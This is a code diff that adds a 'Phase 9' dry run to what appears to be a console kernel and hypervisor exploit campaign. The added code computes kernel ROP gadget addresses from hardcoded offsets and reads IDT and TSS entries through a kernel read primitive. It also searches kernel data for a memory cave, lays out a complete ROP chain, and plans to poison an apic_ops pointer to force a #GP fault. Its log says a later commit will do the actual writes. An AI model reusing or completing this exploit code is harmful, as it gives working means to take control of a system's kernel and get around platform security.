@@ -5566,8 +5566,8 @@ static void campaign_flatz_setup(void) {
         } else {
             printf("    IDT PA: 0x%lx\n", (unsigned long)idt_pa);
 
-            /* Read all 256 IDT entries */
-            uint8_t idt_buf[256 * 16];
+            /* Read all 256 IDT entries (static to avoid stack overflow) */
+            static uint8_t idt_buf[256 * 16];
             kernel_copyout(g_dmap_base + idt_pa,
                            idt_buf, sizeof(idt_buf));
 
@@ -5753,6 +5753,297 @@ static void campaign_flatz_setup(void) {
 
         printf("\n");
         fflush(stdout);
+
+        /* ─── Phase 9: Flatz Method — Dry Run (READ-ONLY) ───
+         *
+         * This phase validates everything needed for the flatz
+         * method WITHOUT modifying any kernel structures.
+         * We calculate addresses, find caves, build the ROP chain
+         * locally, and log the full plan.
+         *
+         * NO IDT/TSS/apic_ops modifications are made here.
+         * Arming will be a separate, deliberate step.
+         */
+        printf("=============================================\n");
+        printf("  Phase 9: Flatz Method — Dry Run (READ-ONLY)\n");
+        printf("=============================================\n\n");
+        fflush(stdout);
+
+        /* Additional kstuff gadget offsets for the ROP chain */
+        #define KSTUFF_ADD_RSP_IRET_OFF (KSTUFF_DORETI_IRET_OFF - 7)
+        #define KSTUFF_POP_ALL_IRET_OFF (-0x9cf8abLL)
+        #define KSTUFF_REP_MOVSB_OFF    (-0x99002aLL)
+        #define KSTUFF_WRMSR_RET_OFF    (-0x9d20ccLL)
+
+        uint64_t ks_add_rsp_iret = g_kdata_base + (int64_t)KSTUFF_ADD_RSP_IRET_OFF;
+        uint64_t ks_pop_all_iret = g_kdata_base + (int64_t)KSTUFF_POP_ALL_IRET_OFF;
+        uint64_t ks_rep_movsb    = g_kdata_base + (int64_t)KSTUFF_REP_MOVSB_OFF;
+        uint64_t ks_wrmsr_ret    = g_kdata_base + (int64_t)KSTUFF_WRMSR_RET_OFF;
+
+        printf("[*] ROP gadget addresses (ktext):\n");
+        printf("    add_rsp_iret:       0x%016lx", (unsigned long)ks_add_rsp_iret);
+        if (ks_add_rsp_iret >= g_ktext_base)
+            printf("  (ktext+0x%lx)", (unsigned long)(ks_add_rsp_iret - g_ktext_base));
+        printf("\n");
+        printf("    doreti_iret:        0x%016lx", (unsigned long)ks_doreti);
+        if (ks_doreti >= g_ktext_base)
+            printf("  (ktext+0x%lx)", (unsigned long)(ks_doreti - g_ktext_base));
+        printf("\n");
+        printf("    nop_ret:            0x%016lx", (unsigned long)ks_nop_ret);
+        if (ks_nop_ret >= g_ktext_base)
+            printf("  (ktext+0x%lx)", (unsigned long)(ks_nop_ret - g_ktext_base));
+        printf("\n");
+        printf("    pop_all_iret:       0x%016lx", (unsigned long)ks_pop_all_iret);
+        if (ks_pop_all_iret >= g_ktext_base)
+            printf("  (ktext+0x%lx)", (unsigned long)(ks_pop_all_iret - g_ktext_base));
+        printf("\n");
+        printf("    rep_movsb_pop_ret:  0x%016lx", (unsigned long)ks_rep_movsb);
+        if (ks_rep_movsb >= g_ktext_base)
+            printf("  (ktext+0x%lx)", (unsigned long)(ks_rep_movsb - g_ktext_base));
+        printf("\n");
+        printf("    wrmsr_ret:          0x%016lx", (unsigned long)ks_wrmsr_ret);
+        if (ks_wrmsr_ret >= g_ktext_base)
+            printf("  (ktext+0x%lx)", (unsigned long)(ks_wrmsr_ret - g_ktext_base));
+        printf("\n");
+        fflush(stdout);
+
+        /* Validate all gadgets are in plausible ktext range */
+        int gadgets_ok = 1;
+        struct { const char *name; uint64_t addr; } gadgets[] = {
+            {"add_rsp_iret",  ks_add_rsp_iret},
+            {"doreti_iret",   ks_doreti},
+            {"nop_ret",       ks_nop_ret},
+            {"pop_all_iret",  ks_pop_all_iret},
+            {"rep_movsb",     ks_rep_movsb},
+            {"wrmsr_ret",     ks_wrmsr_ret},
+        };
+        int n_gadgets = sizeof(gadgets) / sizeof(gadgets[0]);
+        printf("\n[*] Gadget range validation (must be in ktext):\n");
+        for (int g = 0; g < n_gadgets; g++) {
+            int in_range = (gadgets[g].addr >= g_ktext_base &&
+                            gadgets[g].addr < g_ktext_base + 0x2000000);
+            printf("    %-20s 0x%016lx  [%s]\n",
+                   gadgets[g].name,
+                   (unsigned long)gadgets[g].addr,
+                   in_range ? "OK" : "OUT OF RANGE");
+            if (!in_range) gadgets_ok = 0;
+        }
+        fflush(stdout);
+
+        /* Inspect current IDT[13] (#GP) — what we would replace */
+        printf("\n[*] Current IDT[13] (#GP handler) — would be replaced:\n");
+        if (idt_pa) {
+            uint8_t *e13 = &idt_buf[13 * 16];
+            uint64_t gp_cur =
+                (uint64_t)(e13[0] | (e13[1] << 8)) |
+                ((uint64_t)(e13[6] | (e13[7] << 8)) << 16) |
+                ((uint64_t)(e13[8] | (e13[9] << 8) |
+                            (e13[10] << 16) |
+                            (e13[11] << 24)) << 32);
+            uint8_t gp_ist_cur = e13[4] & 0x7;
+            printf("    Handler: 0x%016lx  IST=%d\n",
+                   (unsigned long)gp_cur, gp_ist_cur);
+            printf("    Would change to: handler=0x%016lx  IST=3\n",
+                   (unsigned long)ks_add_rsp_iret);
+            printf("    Raw bytes: ");
+            for (int b = 0; b < 16; b++) printf("%02x ", e13[b]);
+            printf("\n");
+        }
+        fflush(stdout);
+
+        /* Inspect TSS IST3 for all CPUs — what we would overwrite */
+        printf("\n[*] Current TSS IST3 values (would be overwritten):\n");
+        if (tss_pa) {
+            for (int cpu = 0; cpu < 16; cpu++) {
+                uint64_t tss_cpu = g_kdata_base + KSTUFF_TSS_OFF + 0x68 * cpu;
+                uint64_t tss_cpu_pa = va_to_pa_quiet(tss_cpu);
+                if (!tss_cpu_pa) {
+                    printf("    CPU %2d: VA→PA failed (last valid CPU)\n", cpu);
+                    break;
+                }
+                uint64_t ist3_val = 0;
+                uint64_t ist3_off = 0x24 + 2 * 8;  /* IST3 = TSS+0x34 */
+                kernel_copyout(g_dmap_base + tss_cpu_pa + ist3_off,
+                               &ist3_val, 8);
+                printf("    CPU %2d: IST3=0x%016lx  TSS_PA=0x%lx%s\n",
+                       cpu, (unsigned long)ist3_val,
+                       (unsigned long)tss_cpu_pa,
+                       ist3_val ? "" : " (unused)");
+            }
+        }
+        fflush(stdout);
+
+        /* Find suitable cave in kdata */
+        #define CAVE_SIZE 0x280
+
+        printf("\n[*] Searching for ROP cave in kdata (%d bytes needed):\n",
+               CAVE_SIZE);
+
+        uint64_t cave_candidates[] = {
+            KSTUFF_TSS_OFF + 16 * 0x68 + 0x50,
+            KSTUFF_GDT_OFF + 0x1000,
+            KSTUFF_QA_FLAGS_OFF + 0x1000,
+        };
+        int n_candidates = sizeof(cave_candidates) / sizeof(cave_candidates[0]);
+
+        uint64_t best_cave_off = 0, best_cave_kva = 0, best_cave_pa = 0;
+
+        for (int ci = 0; ci < n_candidates; ci++) {
+            uint64_t off = cave_candidates[ci];
+            uint64_t kva = g_kdata_base + off;
+            uint64_t pa  = va_to_pa_quiet(kva);
+            if (!pa) {
+                printf("    kdata+0x%lx: VA→PA failed [SKIP]\n",
+                       (unsigned long)off);
+                continue;
+            }
+
+            /* Read first 64 bytes to check if empty */
+            static uint8_t probe[64];
+            kernel_copyout(g_dmap_base + pa, probe, sizeof(probe));
+            int is_empty = 1;
+            for (int j = 0; j < (int)sizeof(probe); j++) {
+                if (probe[j] != 0) { is_empty = 0; break; }
+            }
+            printf("    kdata+0x%07lx: PA=0x%09lx  %s\n",
+                   (unsigned long)off, (unsigned long)pa,
+                   is_empty ? "[EMPTY — usable]" : "[NON-ZERO — skip]");
+
+            if (is_empty && !best_cave_pa) {
+                /* Verify full CAVE_SIZE is empty */
+                static uint8_t full_probe[CAVE_SIZE];
+                kernel_copyout(g_dmap_base + pa, full_probe, CAVE_SIZE);
+                int full_empty = 1;
+                for (int j = 0; j < CAVE_SIZE; j++) {
+                    if (full_probe[j] != 0) { full_empty = 0; break; }
+                }
+                if (full_empty) {
+                    best_cave_off = off;
+                    best_cave_kva = kva;
+                    best_cave_pa = pa;
+                }
+            }
+        }
+        fflush(stdout);
+
+        if (!best_cave_pa) {
+            printf("[-] No suitable cave found — Phase 9 cannot proceed.\n");
+            fflush(stdout);
+            return;
+        }
+        printf("[+] Best cave: kdata+0x%lx  KVA=0x%016lx  PA=0x%lx\n\n",
+               (unsigned long)best_cave_off,
+               (unsigned long)best_cave_kva,
+               (unsigned long)best_cave_pa);
+        fflush(stdout);
+
+        /* Build ROP chain locally (NOT written to kernel) */
+        printf("[*] Building ROP chain locally (dry run)...\n");
+
+        static uint8_t rop[CAVE_SIZE];
+        memset(rop, 0, sizeof(rop));
+
+        #define ROP_Q(off, val) do { \
+            uint64_t _v = (val); \
+            memcpy(&rop[(off)], &_v, 8); \
+        } while(0)
+
+        /* Phase A: iret to pop_all_iret */
+        ROP_Q(0x0F0, ks_pop_all_iret);      /* RIP */
+        ROP_Q(0x0F8, 0x20);                  /* CS */
+        ROP_Q(0x100, 0x02);                  /* RFLAGS */
+        ROP_Q(0x108, best_cave_kva + 0x118); /* RSP */
+        ROP_Q(0x110, 0x00);                  /* SS */
+
+        /* Phase B: register frame for pop_all_iret */
+        ROP_Q(0x118, best_cave_kva + 0x258); /* RAX (copy dest) */
+        ROP_Q(0x120, best_cave_kva + 0x20);  /* RCX (copy src) */
+        ROP_Q(0x128, 0);                      /* RDX */
+        ROP_Q(0x130, 8);                      /* RBX (copy len) */
+        ROP_Q(0x138, 0);                      /* RSP (unused) */
+        ROP_Q(0x140, 0);                      /* RBP */
+        ROP_Q(0x148, 0);                      /* RSI */
+        ROP_Q(0x150, 0);                      /* RDI */
+        /* pop_all_iret iret frame: */
+        ROP_Q(0x200, ks_rep_movsb);           /* RIP → rep movsb */
+        ROP_Q(0x208, 0x20);                   /* CS */
+        ROP_Q(0x210, 0x02);                   /* RFLAGS */
+        ROP_Q(0x218, best_cave_kva + 0x230);  /* RSP */
+        ROP_Q(0x220, 0x00);                   /* SS */
+
+        /* Phase C: pop rbp + ret to doreti_iret */
+        ROP_Q(0x230, 0);                      /* RBP value */
+        ROP_Q(0x238, ks_doreti);              /* ret addr */
+
+        /* Phase D: final iretq → nop_ret */
+        ROP_Q(0x240, ks_nop_ret);             /* RIP */
+        ROP_Q(0x248, 0x20);                   /* CS */
+        ROP_Q(0x250, 0x02);                   /* RFLAGS */
+        /* 0x258: RSP will be filled at runtime from cave+0x20 */
+        ROP_Q(0x260, 0x00);                   /* SS */
+
+        #undef ROP_Q
+
+        /* Log key ROP chain entries */
+        printf("    [0x0F0] iret RIP:     0x%016lx (pop_all_iret)\n",
+               (unsigned long)ks_pop_all_iret);
+        printf("    [0x108] iret RSP:     0x%016lx (cave+0x118)\n",
+               (unsigned long)(best_cave_kva + 0x118));
+        printf("    [0x200] phase B RIP:  0x%016lx (rep_movsb)\n",
+               (unsigned long)ks_rep_movsb);
+        printf("    [0x218] phase B RSP:  0x%016lx (cave+0x230)\n",
+               (unsigned long)(best_cave_kva + 0x230));
+        printf("    [0x238] phase C ret:  0x%016lx (doreti_iret)\n",
+               (unsigned long)ks_doreti);
+        printf("    [0x240] phase D RIP:  0x%016lx (nop_ret)\n",
+               (unsigned long)ks_nop_ret);
+        printf("    Total chain size:     %d bytes\n", CAVE_SIZE);
+        fflush(stdout);
+
+        /* Show what the poisoned apic_ops[2] would look like */
+        uint64_t orig_xapic = ops[2];
+        uint64_t poisoned_xapic = (orig_xapic & 0x0000FFFFFFFFFFFFULL) |
+                                  (0xdeb7ULL << 48);
+        printf("\n[*] apic_ops[2] poisoning plan:\n");
+        printf("    Original:  0x%016lx\n", (unsigned long)orig_xapic);
+        printf("    Poisoned:  0x%016lx  (top 16 bits → 0xdeb7)\n",
+               (unsigned long)poisoned_xapic);
+        printf("    On call:   CPU jumps to non-canonical addr → #GP\n");
+        fflush(stdout);
+
+        /* Overall readiness check */
+        int ready = gadgets_ok && idt_pa && tss_pa && best_cave_pa;
+
+        printf("\n[+] ============================================\n");
+        printf("[+]  PHASE 9: DRY RUN COMPLETE\n");
+        printf("[+] ============================================\n");
+        printf("[+]  Gadgets valid:   %s\n", gadgets_ok ? "YES" : "NO");
+        printf("[+]  IDT accessible:  %s\n", idt_pa ? "YES" : "NO");
+        printf("[+]  TSS accessible:  %s\n", tss_pa ? "YES" : "NO");
+        printf("[+]  Cave found:      %s (kdata+0x%lx)\n",
+               best_cave_pa ? "YES" : "NO",
+               (unsigned long)best_cave_off);
+        printf("[+]  ROP chain built: YES (local buffer only)\n");
+        printf("[+]\n");
+        if (ready)
+            printf("[+]  STATUS: READY TO ARM (all checks passed)\n");
+        else
+            printf("[-]  STATUS: NOT READY (see failures above)\n");
+        printf("[+]\n");
+        printf("[+]  *** NO kernel structures were modified. ***\n");
+        printf("[+]  *** This was a read-only validation pass. ***\n");
+        printf("[+]\n");
+        printf("[+]  Next step: If all checks pass, a follow-up\n");
+        printf("[+]  commit will add the actual arming code that\n");
+        printf("[+]  writes ROP cave, patches IDT[13], sets TSS\n");
+        printf("[+]  IST3, and poisons apic_ops[2].\n");
+
+        printf("\n");
+        fflush(stdout);
+
+        notify(ready
+               ? "[HV Research] Phase 9 dry run: READY TO ARM"
+               : "[HV Research] Phase 9 dry run: NOT READY");
         return;
     }
 
